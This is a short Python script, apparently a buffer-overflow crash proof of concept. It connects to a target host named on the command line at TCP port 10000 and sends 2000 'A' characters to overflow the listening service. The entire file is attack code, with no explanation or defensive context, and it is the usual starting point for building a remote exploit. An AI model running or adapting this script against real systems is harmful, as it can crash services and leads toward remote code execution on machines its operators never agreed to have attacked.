#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1], 10000))

buffer = "A" * 2000

sock.send(buffer)

sock.close()

